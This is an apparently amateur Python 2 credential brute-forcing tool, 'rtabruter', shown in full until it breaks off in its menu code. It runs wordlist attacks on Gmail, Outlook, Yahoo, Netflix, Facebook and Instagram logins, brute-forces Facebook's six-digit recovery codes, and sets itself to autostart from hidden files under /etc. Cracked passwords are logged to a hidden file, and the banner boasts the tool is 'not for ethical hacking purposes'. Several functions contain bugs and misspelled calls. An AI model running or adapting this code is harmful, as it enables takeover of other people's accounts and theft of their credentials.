#hello friend.. i hope enjoy with my script..i just want u know that i'm stiil beginner in python.. and this is my first script in python..so maybe u'll found this script sucks :)
#
#
#
#


import time
import webbrowser
import smtplib
import string
import sys
import random
import mechanize
import cookielib
import os


#some damn colors

def prRed(prt): print("\033[91m {}\033[00m" .format(prt))
def prGreen(prt): print("\033[92m {}\033[00m" .format(prt))
def prYellow(prt): print("\033[93m {}\033[00m" .format(prt))
def prLightPurple(prt): print("\033[94m {}\033[00m" .format(prt))
def prPurple(prt): print("\033[95m {}\033[00m" .format(prt))
def prCyan(prt): print("\033[96m {}\033[00m" .format(prt))
def prLightGray(prt): print("\033[97m {}\033[00m" .format(prt))
def prBlack(prt): print("\033[34m {}\033[00m" .format(prt))
def prBlue(prt): print("\033[34m {}\033[00m" .format(prt))


#auto run : show messagen read the 
def aoutostart() :
	autsta_status =  raw_input("start the script when the system reboot and append the attack??(Y/N) : ")
	
	return autsta_status


#help menu :)

def helpe() :
 os.system("clear")
 prYellow (""" 
			 ____  ______   ____ 
			|    \|      | /    |
			|  D  )      ||  o  |
			|    /|_|  |_||     |
			|    \  |  |  |  _  |
			|  .  \ |  |  |  |  |
			|__|\_| |__|  |__|__|
                      
""")
 print ("\033[1;34m  python rtabruter.py \033[93m {autorun_stop|autorun_status|history|wipe_history|help } \n" )

 print ("\033[1;91m   autorun_stop   -  \033[93m  Disable auto run.\n")
 print ("\033[1;91m   autorun_status   -  \033[93m show auto run status ( enbled / disabled ).\n")
 print ("\033[1;91m   history   -  \033[93m show all sucuess login info. \n")
 print ("\033[1;91m   wipe_history   -  \033[93m clear history. \n")
 print ("\033[1;91m   help   -  \033[93m This menu. \n")

#br setinng
def br_setup() :
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)


#bash file to setup auto run when sys reboot :)

def bashfile() :


	os.system("sudo echo '#!/bin/bash' > /etc/.rtabruter/.autorun.sh && "+ "sudo echo python " + os.path.abspath("rtabruter.py") + " >> /etc/.rtabruter/.autorun.sh  && sudo chmod +x /etc/.rtabruter/.autorun.sh")
	os.system("sudo touch /etc/xdg/autostart/rtabruter.desktop && sudo chmod 777 /etc/xdg/autostart/rtabruter.desktop")
	os.system("sudo echo '[Desktop Entry]' > /etc/xdg/autostart/rtabruter.desktop && echo 'Name=.autorun.sh' >> /etc/xdg/autostart/rtabruter.desktop " + " && echo 'Exec=/etc/.rtabruter/.autorun.sh'" + " >> /etc/xdg/autostart/rtabruter.desktop && echo 'Terminal=true' >> /etc/xdg/autostart/rtabruter.desktop && sudo echo 'Type=Application' >> /etc/xdg/autostart/rtabruter.desktop  && sudo echo 'X-GNOME-Autostart-enabled=true' >> /etc/xdg/autostart/rtabruter.desktop ")
	

#check outo run status and exit if it's On :)
def stop_autorun() :

		if os.path.isfile("/etc/xdg/autostart/rtabruter.desktop"):
			 os.system("sudo rm -r /etc/.rtabruter/")
			 os.system("sudo rm /etc/xdg/autostart/rtabruter.desktop")
			 sys.exit(1)

def autostart_tst() :

	   if os.path.isfile("/etc/xdg/autostart/rtabruter.desktop"):
		print ("you cant run tow atack as autostart .. pleas!!")
		sys.exit(1)



def w_history(password) :
	
	
	history_f = open("/var/log/.rtabruter", "a")
	if aoutostartcheck  == True and idd == 1 :
	 history_f.write ("web :" +readweb +" | " + "type of brute :"+ readtype +" | " +"email : "+ email + " | " + "password : " + password + "\n")
	else :
	 history_f.write ("web :" + web + " | " + "type of brute :" + typpe +" | " +"email : " + email + " | " + "password : " + password + "\n")



def w_history1(password) :
		
	history_f = open("/var/log/.rtabruter", "a")
	if aoutostartcheck == True and idd == 1 :
	 history_f.write ("web :" +readweb +" | " + "type of brute :"+ readtype +" | " +"email : "+ password + " | " + "password : " + email + "\n")
	else :
	 history_f.write ("web :" + web + " | " + "type of brute :" + typpe +" | " +"email : " + password + " | " + "password : " + email + "\n")



		
def r_history() :
	 if os.path.isfile("/var/log/.rtabruter"):
		os.system("cat /var/log/.rtabruter")
		sys.exit(1)


	
def clear_history():
	 if os.path.isfile("/var/log/.rtabruter"):
		os.system("rm /var/log/.rtabruter")
		sys.exit(1)
	


#write atack info in txt_file :)


def aoutst_inf(status, web , typpe , user , pssf) :
	
			print("to stop autostartup python rtabruter.py aoutorun_stop :...")
			os.system("mkdir /etc/.rtabruter")
			os.system("cat " + passwordlist + " > /etc/.rtabruter/." + passwordlist)
			os.system("touch /etc/.rtabruter/.autorun")
			autstartfile = open("/etc/.rtabruter/.autorun", "w")
			pssf = "." + pssf
			autstartfile.write(str(status) + "\n")# aouto start status
			autstartfile.write(str(web) + "\n")# website
			autstartfile.write(typpe +"\n")# type of brtfc
			autstartfile.write(user + "\n")# username
			autstartfile.write( "/etc/.rtabruter/" + pssf + "\n")# path of passwordlist		
			autstartfile.close()

#banner :)

def intrf() :

	print("\033c")
	sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=33, cols=86))

	prGreen("                                 .___." )
	prGreen("          /)                  ,-^     ^-." )
	prGreen("         //                  /           \"")
	prGreen(".-------| |-----------------/  __     __  \-------------------.__")
	prBlue("|WMWMWMW| |>>>>>>>>>>>>>>>>>| />>\   />>\ |>>>>>>>>>>>>>>>>>>>>>>:>")
	prGreen("`-------| |---------------- | \__/   \__/ |-------------------'^^")
	prGreen("         \\  		      \    /|\    /~~|~~|  ||~~|\  /| ")
	prGreen("          \)|~~\  /\  |~~\|~~ \   \_/   /   |  |--||--| \/ |")
	prGreen("            |__/ /__\ |__/|--  |       |    |  |  ||__|    |")
	prGreen("            |  \/    \|   |__  |+H+H+H+|     ")
	prGreen("                      '	\       /  ALL ")
	prGreen("                   		 ^-----^    " )
        prYellow ( """   		          _   _   _   _   _   _   _   
 		         / \ / \ / \ / \ / \ / \ / \  """)
	prBlue ("	     	        ( Y | C | 3 | e | x | 7 | 7 )")
	prYellow ("""	     	         \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
								""") 
          
	prLightPurple (  "      =================================================================");
	print "\033[1;31m        this tool is not for ethical hacking purposes, Fuck the world!!  \033[00m      ";
	print "\033[1;33m                            created by [[ cy3exr77 ]]        \033[00m        ";
	prGreen( "                      FB :https://www.facebook.com/ycexr                                  ");
	prLightPurple(  "      =================================================================\033[00m");    
	
	print"\033[1;34m"

def hidpass(password) :

    if idd == 1 :

	 passlist= open( passwordlist ,"r")
			
	 lines = passlist.readlines()
	 passlist.close()
			
	 passlist = open(passwordlist , "w")
			
         for line in lines:
			  
	     if line !=  str ( password + "\n" ):
				 
		passlist.write(line)
		   	   	 
	 passlist.close()


    elif idd == 0 and aoutostartcheck == True :

	# hp = "/etc/.rtabruter/." + passwordlist.name()
	 hd_ps = os.path.basename(passwordlist)
	 hd_ps = "/etc/.rtabruter/." + hd_ps
	 passlist= open( hd_ps ,"r")
			
	 lines = passlist.readlines()
	 passlist.close()
			
	 passlist = open(hd_ps , "w")
			
         for line in lines:
			  
	     if line !=  str ( password + "\n" ):
				 
		passlist.write(line)
		   	   	 
	 passlist.close()



# ****** gmmmaiiiil  ******


# normal brute ( :
def gmail() :



    smtpserver = smtplib.SMTP("smtp.gmail.com" ,587)
    smtpserver.ehlo()
    smtpserver.starttls()

  
    passwordfile = open(passwordlist , "r")
    i = 0
    print("\033[92m===============================================")
    print("\033[92m[*] Cracking Started on: %s ..." %(email))
    print("\033[92m===============================================")
    
    start = time.time()
    for password in passwordfile:
        try :
            smtpserver.login(email,password)
	    end = time.time()
	    elapsed = end - start
	    str(elapsed)
	    print("\033[1;33m############################################")
            print("\033[1;33m[+] Password Cracked :%s[*]Tested passwords %d\n[*]elapsed %s s" %(password , i, elapsed) )
	    print("\033[1;33m############################################")
	    w_history(password)
	    stop_autorun()
	    raw_input("")
            break
        except smtplib.SMTPAuthenticationError :
	    i = i+1
	    prRed("[!] password incorrect ===> {}".format(password))
	    hidpass(password)
	    
#one pasword for emailslist :)

def gmail1() :



    smtpserver = smtplib.SMTP("smtp.gmail.com" ,587)
    smtpserver.ehlo()
    smtpserver.starttls()


    passwordfile = open(passwordlist , "r")
    
    i = 0
    print("\033[92m===============================================")
    print("\033[92m[*] Cracking Started on: %s" %(email))
    print("\033[92m===============================================")
  
    start = time.time()
    for password in passwordfile:
	password = password.replace("\n","")
	j = 0
        try :
	  
            smtpserver.login(password,email)
	    end = time.time()
	    elapsed = end - start
	    j = j + 1
	    str(elapsed)
	    prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
	    print("\033[1;33mlogin sucuess to : %s | Tested passwords %d| elapsed %s s" %(password , i, elapsed ) )     
	    prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
	    w_history1(password)
	    hidpass(password)
	    smtpserver = smtplib.SMTP("smtp.gmail.com" ,587)
	    smtpserver.ehlo()
            smtpserver.starttls()

        except smtplib.SMTPAuthenticationError :
	    i = i+1
	    prRed("[!] login failed ===> {}".format(password))

	    hidpass(password)
    raw_input("")	

	   
#################################################################################################################################

#outlook :

#normal brutefrc

def microsoft() :
    smtpserver = smtplib.SMTP("smtp.live.com",587)
    smtpserver.ehlo()
    smtpserver.starttls()
    i = 0
    
    start = time.time()
    passwords = open(passwordlist, "r")
    print("\033[92m===============================================")
    print("\033[92m[+] Cracking Started on: %s " %(email))
    print("\033[92m===============================================")


    for password in passwords:
	password = password.replace("\n","")
        if i == 3 :
	 i = 0
	 smtpserver = smtplib.SMTP("smtp.live.com",587)
         smtpserver.ehlo()
         smtpserver.starttls()        
        try:
	    
            smtpserver.login(email,password)
	    end = time.time()
	    elapsed = end - start
	    str(elapsed)
	    prYellow ("##########################################" )
	    print("\033[1;33m[+] Password Cracked : %s\n[*]Tested passwords : %d\n[*]elapsed %s s" %(password , i, elapsed ) )     
	    prYellow ("############################################")
	    w_history(password)
	    stop_autorun()
	    raw_input("")
            break
        except smtplib.SMTPAuthenticationError :
            print("\033[1;31m[!] password incorrect ==> %s" %(password)) 
	    i = i +1
	    hidpass(password)



#/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/

#one passwrd

def microsoft1() :
    i = 0
    smtpserver = smtplib.SMTP("smtp.live.com",587)
    smtpserver.ehlo()
    smtpserver.starttls()

    passwords = open(passwordlist, "r")
    print("\033[92m===============================================")
    print("\033[92m[+] Cracking Started on: %s " %(email))
    print("\033[92m===============================================")
  
    for password in passwords:
        
	password = password.replace("\n","")
	start = time.time()
	smtpserver = smtplib.SMTP("smtp.live.com",587)
        smtpserver.ehlo()
        smtpserver.starttls()        
        try:
	    
            smtpserver.login(password,email)
	    end = time.time()
	    elapsed = end - start
	    str(elapsed)
	    prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
	    print("\033[1;33mlogin sucuess to : %s|Tested passwords %d |[*]elapsed %s s" %(password , i, elapsed ) )     
	    prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
	    w_history1(password)
	    
          
        except smtplib.SMTPAuthenticationError :
            print("\033[1;31m[!] password incorrect ==> %s" %(password)) 
	    i = i +1
	    hidpass(password)
    stop_autorun()


##################################################################################

#yahoo

#nrml


def yahoo():

	br_setup()
	wlcm_yahoo()
	search_yahoo()
	print("Password does not exist in the wordlist")
	sys.exit(1)



def brute_yahoo(password , i , start):

	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['username'] = email
	sub = br.submit()
	br.select_form(nr = 0)
	br.form['password'] = password
	sub = br.submit()
	log = sub.geturl()
	if 'p=' in log :
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("##########################################" )
		print("\033[1;33m[+] Password Cracked : %s\n[*]Tested passwords : %d\n[*]elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("############################################")
		w_history(password)
		stop_autorun()
		raw_input("")
		sys.exit(1)
	else :
		
	
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)



def search_yahoo():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		brute_yahoo(password , i , start)

#wlcm 
def wlcm_yahoo():
		
		total = open(passwordlist,"r")

		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")

#one pass brute

def yahoo1():

	br_setup()
	wlcm_yahoo1()
	search_yahoo1()



def brute_yahoo1(password , i , start):

	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['username'] = password
	sub = br.submit()
	br.select_form(nr = 0)
	try :
	 br.form['password'] = email
	except :
		
         sub = br.submit()
	 log = sub.geturl()
	 if 'p=' in log :
	         end = time.time()
	         elapsed = end - start
	         str(elapsed)
	  	 prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
		 print("\033[1;33mlogin sucuess to : %s | Tested passwords %d |elapsed %s s" %(password , i, elapsed ) )     
		 prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		 w_history1(password)
	 else :
		
	
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)



def search_yahoo1():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		brute_yahoo1(password , i , start)

#welcome 
def wlcm_yahoo1():
		
		total = open(passwordlist,"r")

		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")

#####################################################################################################"""
#netflix :

#nrmal brutefrc :)

def netflix():
	
	br_setup()
	wlcm_netflix()
	search_netflix()
	print("Password does not exist in the wordlist")
	sys.exit(1)



def brute_netflix(password , i , start):

	sys.stdout.flush()

	br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        site = br.open(login)			
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['password'] = password
	sub = br.submit()
	log = sub.geturl()
	if 'browse' in log :
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("##########################################" )
		print("\033[1;33m[+] Password Cracked : %s\n[*]Tested passwords : %d\n[*]elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("############################################")
		w_history(password)
		stop_autorun()
		raw_input("")
		sys.exit(1)
	else :
		
	
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)



def search_netflix():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		brute_netflix(password , i , start)

#welcome 
def wlcm_netflix():
		
		total = open(passwordlist,"r")
		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")


#************* netflix op 2 ************************

def netflix1():
	
	br_setup()
	wlcm_netflix1()
	search_netflix1()
	sys.exit(1)



def brute_netflix1(password , i , start):

	sys.stdout.flush()
	#br.addheaders = [('User-agent', random.choice(useragents))]
	br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        site = br.open(login)			
	br.select_form(nr = 0)
	br.form['email'] = password
	br.form['password'] = email
	sub = br.submit()
	log = sub.geturl()
	if 'browse' in log :
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
		print("\033[1;33mlogin sucuess to : %s |Tested passwords %d |elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		
	
		w_history1(password)
		br_setup()
		
	else :
		
	
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)



def search_netflix1():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		brute_netflix1(password , i , start)


def wlcm_netflix1():
		
		total = open(passwordlist,"r")
		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")



#################################################################################################################


def facebook():

	br_setup()
	wlcm()

	search()
	print("Password does not exist in the wordlist")
	sys.exit(1)



def facebook_brute(password , i , start):

	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()

	if log != login and (not 'login_attempt' in log):
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("##########################################" )
		print("\033[1;33m[+] Password Cracked : %s\n[*]Tested passwords : %d\n[*]elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("############################################")
		w_history(password)
		stop_autorun()
		raw_input("")
		sys.exit(1)
	else :
		
	
		prRed("[!] {} ===> Failed".format(password))
	
		hidpass(password)	
	
			
	



def search():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		facebook_brute(password , i , start)


def wlcm():
		
		total = open(passwordlist,"r")

		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")
	
#////////////////////////////////////



def facebook1():
	br_setup()
	search1()
	print("Password does not exist in the wordlist")



def brute1(password , i , start):
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] =  password
	br.form['pass'] =  password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
		print("\033[1;33mlogin sucuess to : %s | Tested passwords %d |elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		w_history1(password)
	else :
		password =  password
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)


def search1():
	start = time.time()
	global password
	i = 0
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		i = i+1
		brute1(password , i , start)




#/////////////////////////////////////////////////////////////////////


def facebooknumber(codec):
	gbr_setup()
	search1number(codec)


def brute1number(password , i , start , codec):
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = codec + password
	br.form['pass'] = "0" + password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
		print("\033[1;33mlogin sucuess to : %s | Tested passwords %d | elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		w_history(password)
	else :
		password = "0" + password
		prRed("[!] {} ===> Failed".format(password))
	
		hidpass(password)	
 



def search1number(codec):
	start = time.time()
	global password
	i = 0
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		i = i+1
		brute1number(password , i , start , codec)



#***

def facebook2():
	br_setup()
	welcome2()
	search2()
	sys.exit(1)



def brute2(password , i , start):
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = password
	br.form['pass'] = email
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
		print("\033[1;33mlogin sucuess to : %s\tTested passwords %d\t[*]elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		w_history1(password)
	else :
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)	
		
	




def search2():
	start = time.time()
	global password
	i = 0
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		i = i+1
		brute2(password , i , start)
 
def welcome2():
		total = open(passwordlist,"r")
		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s") %email
    		print("\033[92m===============================================")





##########################################"""
#six digit brute

def facebook_sixdigit():
	global block
	block = 0	
	br_setup()
	#prLightPurple("***starting tor service!!***\n")
	welcomesixdigit()
	block = 0
	searchsixdigit()
	print("Code does not exist in the wordlist")
	os.system("proxychains anonsurf myip")


def brutesixdigit(password , i , start  ):
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	login = 'https://www.facebook.com/recover/password/?u=' + email + '&n=' + password + '&fl=default_recover&sih=0'
	site = br.open(login)
	global block

	# i think that this is the best way :) 
	try:
		br.select_form(nr = 0)
    		br.form['password_new'] = "hey_there"
		check = 1
	except:
 		
		check = 0
	
	if check == 1 :
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("##########################################" )
		print("\033[1;33m[+] Code Cracked : %s\n[*]Tested codes : %d\n[*]elapsed %s s" %(password , i, elapsed ) )   
		print ("open this link to change password :%s" %(login))  
		prYellow ("############################################")
		w_history(password)
		sys.exit(1)
	else :
		


	        print i
			
		if block == 5 :
			
			block = 0	
			
		else :
		        block = block + 1
			prRed("[!] {} ===> Failed".format(password))
			hidpass(password)

			


def searchsixdigit():
	start = time.time()
	global password
	i = 0
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		i = i+1
		brutesixdigit(password , i , start )

#welcome 
def welcomesixdigit():
		total = open(passwordlist,"r")
		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")




##############################################################################################


#instagrme ;)

def instagram():
	
	br_setup()
	instagram_welcome()
	instagram_search()
	print("Password does not exist in the wordlist")
	sys.exit(1)



def instagram_brute(password , i , start):

	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        site = br.open(login)			
	br.select_form(nr = 0)
	br.form['username'] = email
	br.form['password'] = password
	sub = br.submit()
	log = sub.geturl()
	if not 'accounts/login/' in log :
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("##########################################" )
		print("\033[1;33m[+] Password Cracked : %s\n[*]Tested passwords : %d\n[*]elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("############################################")
		w_history(password)
		stop_autorun()
		sys.exit(1)
	else :
		
	
		prRed("[!] {} ===> Failed".format(password))
		
		hidpass(password)



def instagram_search():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		instagram_brute(password , i , start)

#welcome 
def instagram_welcome():
		
		total = open(passwordlist,"r")
		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")

#*********************************


def instagram1():
	
	br_setup()
	instagram_welcome1()
	instagram_search1()
	print("Password does not exist in the wordlist")
	sys.exit(1)



def instagram_brute1(password , i , start):

	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        site = br.open(login)			
	br.select_form(nr = 0)
	br.form['username'] = email
	br.form['password'] = password
	sub = br.submit()
	log = sub.geturl()
	if not 'accounts/login/' in log :
	        end = time.time()
	        elapsed = end - start
	        str(elapsed)
		prYellow ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" )
		print("\033[1;33mlogin sucuess to : %s | Tested passwords %d | elapsed %s s" %(password , i, elapsed ) )     
		prYellow ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
		w_history1(password)
		sys.exit(1)
	else :
		
	
		prRed("[!] {} ===> Failed".format(password))
		hidpass(password)



def instagram_search1():

	start = time.time()
	global password
	i = 0


	passwords = open(passwordlist,"r")

	for password in passwords:
		password = password.replace("\n","")
		i = i+1

		instagram_brute1(password , i , start)


def instagram_welcome1():
		
		total = open(passwordlist,"r")
		total = total.readlines()
	        print("\033[92m===============================================")
    		print("\033[92m[*] Cracking Started on: %s ...") %email
    		print("\033[92m===============================================")






#====================================================================================================================================
#====================================================================================================================================


#main


if os.geteuid() != 0:
 os.execvp("sudo", ["sudo"] + ["python"] + sys.argv)
if len(sys.argv) == 2 :
	if sys.argv[1] == "autorun_stop" :
		if os.path.isfile("/etc/xdg/autostart/rtabruter.desktop"):
			os.system("sudo rm -r /etc/.rtabruter/")
			os.system("sudo rm /etc/xdg/autostart/rtabruter.desktop")
			print ("[+]auto start  has stoped")
			sys.exit(1)
		else :
			print ("autorun status is alerady stoped!!")
			sys.exit(1)

	elif sys.argv[1] == "autorun_status" :
		if os.path.isfile("/etc/xdg/autostart/rtabruter.desktop") :
			print ("auto run  is ON")
		else :
			print ("auto run is OFF")
		sys.exit(1)

	elif sys.argv[1] == "help" :
		
		helpe()
		sys.exit(1)

	elif sys.argv[1] == "history" :
			
		r_history()
		sys.exit(1)
	elif sys.argv[1] == "wipe_history" :
		clear_history()
		sys.exit(1)
	else :
		prYellow("[!]Unknown option: %s"%(sys.argv[1]))
		prYellow("Try `python rtabruter help' for more information.!!")
		sys.exit(1)



elif len(sys.argv) > 2 :
	print ("[!]Unknown option!!")
	print ("Try `python fbbrute --help' for more information.!!")
	sys.exit(1)

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) 	   Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
idd = 0
#check if outo run prop is on and read info if it is :)
if os.path.isfile("/etc/xdg/autostart/rtabruter.desktop"):
 idd = 1


if os.path.isfile("/etc/.rtabruter/.autorun"):	
	autstartfile = open("/etc/.rtabruter/.autorun", "r")
	aoutostartcheck = True
	data = autstartfile.read().split("\n")
	j=0
	for line in data:

	 if j == 1 :
		readweb=str(line) 
		j = j +1
	 elif j == 2 :
		readtype = line	
		j= j +1
	 elif j == 3 :	

	    if readtype == "user_pass" :
	       readtype1 = line
	       j = j+1

	    else :
		readuser = line
		j = j +1
	 elif j== 4 :
		 readp = line
		 j = j+1
	 elif j == 5 :       
	  	 readcode = line
		 j = j + 1
	 else : 
		j = j+1
	


	if readweb == "facebook" :
         
	
	   if  readtype == "normal" :
	 	email = readuser
		passwordlist = readp
		login = 'https://www.facebook.com/login.php?login_attempt=1'
		facebook()
	   elif readtype == "user_pass" :
		passwordlist = readp
		login = 'https://www.facebook.com/login.php?login_attempt=1'
		if readtype1 == "email" :

			facebook1()
		else :
			facebooknumber(readcode)
	   elif readtype == "onepass" :
		email = readuser
		passwordlist = readp
		login = 'https://www.facebook.com/login.php?login_attempt=1'
		facebook2()
	   elif readtype == "sixdigit" :
		login = 'https://www.facebook.com/recover/password/?u=100010628019234&n=000000&fl=default_recover&sih=0'
		passwordlist = readp		
		facebook_sixdigit()
				
	elif readweb == "gmail" :
		if readtype == "normal" :
			email = readuser
			passwordlist = readp
			gmail()

		elif readtype == "onepass" :
			email = readuser
			passwordlist = readp
			gmail1()		
			

	elif readweb == "microsoft" : 

		if readtype == "normal" : 
			email = readuser
			passwordlist = readp
			microsoft()


		elif readtype == "onepass" :
			email = readuser
			passwordlist = readp
			microsoft1()

			
	elif readweb == "yahoo" :
		login = 'https://login.yahoo.com/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0'
		if readtype == "normal" :
			email = readuser
			passwordlist = readp
			yahoo()
	
	  
		else :

			email = readuser
			passwordlist = readp
			yahoo1()

	elif readweb == "netflix" :
		login = "https://www.netflix.com/ma-en/Login"
		if readtype == "normal" :
			email = readuser
			passwordlist = readp
			
			netflix()

		
		elif readtype == "onepass" :
			email = readuser
			passwordlist = readp

			netflix1()


	elif readweb == "instagram" :
		login = "http://www.instagram.com/accounts/login/"
		if readtype == "normal" :
	
			email = readuser
			passwordlist = readp
			instgram()

	
		elif readtype == "onepass" :
			email = readuser
			passwordlist = readp
			instagram1()

			
	
			

else :
        aoutostartcheck = False



	
	checki = 0
	while (checki==0) :  #make shure that user will select from menu :)
	    intrf()
	    
	    print("\033[34m[1] Gmail        [2] Hotmail        [3] Office 365\n")
	    print("\033[34m[4] Outlook      [5] Yahoo          [6] Netflix\n")
	    print("\033[34m[7] Facbook      [8] Instagram        \n")

	    choix = raw_input("selecte from menu :")
	

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# ========>         Gmail         <===========
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	    
	    if choix == "1":
	      web = 'gmail'
	      checki = 1
